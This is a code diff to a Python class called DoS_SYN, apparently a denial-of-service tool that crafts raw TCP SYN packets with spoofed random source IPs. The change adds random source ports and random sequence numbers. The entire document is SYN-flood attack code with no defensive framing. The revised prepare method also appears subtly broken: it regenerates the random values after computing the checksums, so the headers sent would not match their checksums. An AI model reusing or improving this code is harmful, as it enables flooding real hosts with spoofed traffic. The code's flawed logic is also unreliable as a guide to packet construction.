@@ -405,18 +405,17 @@ class DoS_SYN :
 
     def prepare(self) -> bytes :
         randip = self.random_ip()
-        randidn = random.randint(0, 65535)
+        randnum = lambda x : random.randint(x, 65535)
         src = socket.inet_pton(socket.AF_INET, randip)
         dst = socket.inet_pton(socket.AF_INET, self.host)
-        ip_header = self.ip_header(src = src, dst = dst, idn = randidn)
+        ip_header = self.ip_header(src = src, dst = dst, idn = randnum(0))
         checksum = self.checksum(ip_header)
-        ip_header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum)
-        randseq = random.randint(0, 65535)
-        tcp_header = self.tcp_header(dsp = self.port, seq = randseq, syn = 1)
+        ip_header = self.ip_header(src = src, dst = dst, idn = randnum(0), csm = checksum)
+        tcp_header = self.tcp_header(srp = randnum(1024), dsp = self.port, seq = randnum(0), syn = 1)
         pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(tcp_header))
         data = tcp_header + pseudo_header
         tcp_checksum = self.checksum(data)
-        tcp_header = self.tcp_header(dsp = self.port, seq = randseq, syn = 1, csm = tcp_checksum)
+        tcp_header = self.tcp_header(srp = randnum(1024), dsp = self.port, seq = randnum(0), syn = 1, csm = tcp_checksum)
         payload = ip_header + tcp_header
         return payload
 
@@ -440,7 +439,7 @@ class DoS_SYN :
         return datagram
 
     @staticmethod
-    def tcp_header(srp : int = 1337, dsp : int = 0,
+    def tcp_header(srp : int = 0, dsp : int = 0,
         seq : int = 0, acn : int = 0,
         oft : int = 5, urg : int = 0,
         ack : int = 0, psh : int = 0,
